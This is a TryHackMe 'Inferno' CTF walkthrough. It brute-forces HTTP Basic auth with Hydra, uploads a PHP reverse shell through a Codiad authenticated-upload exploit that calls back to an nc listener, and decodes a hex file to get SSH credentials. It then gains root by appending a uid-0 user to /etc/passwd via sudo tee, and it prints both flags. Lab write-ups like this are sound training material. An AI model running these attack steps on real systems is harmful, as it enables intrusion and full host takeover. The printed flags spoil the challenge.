# TRYHACKME INFERNO MACHINE - Complete Exploitation Walkthrough

**IP:** 10.10.213.87  
**Date:** November 17, 2025  
**Difficulty:** medium  

---

## TABLE OF CONTENTS
1. Reconnaissance & Enumeration
2. Initial Access
3. Lateral Movement
4. Privilege Escalation
5. Capturing the flags

---

## PHASE 1: RECONNAISSANCE & ENUMERATION

### Step 1: Port Scanning

```bash
rustscan -a 10.10.213.87
```

**Results**
```
Open 10.10.213.87:21
Open 10.10.213.87:25
Open 10.10.213.87:22
Open 10.10.213.87:23
Open 10.10.213.87:80
....
```

---

### Step 2: Web Server Enumeration

```bash
curl http://10.10.213.87/
```

**Finding:** Basic web page with title "Dante's Inferno"

---

### Step 3: Directory Bruteforcing

```bash
gobuster dir -u http://10.10.213.87 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php -ne
```

**Results**
```
/index.html           (Status: 200) [Size: 638]
/inferno              (Status: 401) [Size: 459]
```

---

### Step 4: Endpoint Enumeration

```bash
curl http://10.10.213.87/inferno
```
**Finding** We find a Basic Authentication popup.

---

### Step 5: Bruteforcing Creds

**User.txt**
- admin
- inferno
- dante

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.213.87 http-get /inferno -f
```

**Result**
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-17 10:16:22
[DATA] max 64 tasks per 1 server, overall 64 tasks, 43033197 login tries (l:3/p:14344399), ~672394 tries per task
[DATA] attacking http-get://10.10.213.87:80/inferno
[STATUS] 7743.00 tries/min, 7743 tries in 00:01h, 43025454 to do in 92:37h, 64 active
[80][http-get] host: 10.10.213.87   login: admin   password: dante1
[STATUS] attack finished for 10.10.213.87 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-17 10:18:09
```
**Username:** admin  
**Password:** dante1

---

## PHASE 2: Initial Access

### Step 1: Logging in and discovering Codiad

Once authenticated, I landed on a web-based IDE called Codiad. Knowing it’s a PHP-based IDE, I turned to searchsploit to look for known vulnerabilities.

```bash
searchsploit codiad
```
**Result**
```
Codiad 2.4.3 - Multiple Vulnerabilities
Codiad 2.5.3 - Local File Inclusion
Codiad 2.8.4 - Remote Code Execution (Authenticated)
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)   
```

**Found one which was interesting**
```
Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)
Author: P4p4_M4n3
Vendor Homepage: http://codiad.com/
Software Links : https://github.com/Codiad/Codiad/releases
Type:  WebApp
```
**poc**
- login on codiad
- go to themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/" directory 
- right click and select upload file
- click on "Drag file or Click Here To Upload" and select your reverse_shell file 

---

### Step 2: Getting a Reverse Shell

```bash
curl http://10.10.213.87/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php -u "admin:dante1" 
```

**Result**
```
nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.21.11.231] from (UNKNOWN) [10.10.213.87] 48572
Linux ip-10-10-213-87 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:33:14 up 42 min,  0 users,  load average: 0.35, 0.12, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-213-87:/$ 
```

---

## PHASE 3: Lateral Movement

### Step 1: From www-data to dante

There is a file in Downloads containing encoded creds
```
www-data@ip-10-10-213-87:/home/dante/Downloads$ ls -la
ls -la
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante    4096 Jan 11  2021 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoXX.docx
```

```
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```
**Username:** dante  
**Password:** V1rg1l10h3lpm3

---

## PHASE 4: Privilege Escalation

### Step 1: Privilege Escalation to root

I found a sudo privilege "tee" which meant I could write arbitrary content to files as root using tee. I used this to add a new user with root privileges.
```
dante@ip-10-10-213-87:~$ sudo -l
Matching Defaults entries for dante on ip-10-10-213-87:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on ip-10-10-213-87:
    (root) NOPASSWD: /usr/bin/tee
```

```bash
openssl passwd rex
echo "rex:GU5kAb9tmQd/I:0:0:root:/root:/bin/bash" | sudo /usr/bin/tee -a "/etc/passwd"
```

**Result**
```
dante@ip-10-10-213-87:~$ su rex
Password: 
root@ip-10-10-213-87:/home/dante# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## PHASE 5: Capturing the Flags

### Step 1: Obtain the Flags

```bash
cat /home/dante/local.txt
cat /root/proof.txt
```

**User Flag** 77f6f3c544ec0811e2d1243e2e0d1835  
**Root Flag** f332678ed0d0767d7434b8516a7c6144

---

## Congrats! You've rooted Inferno!
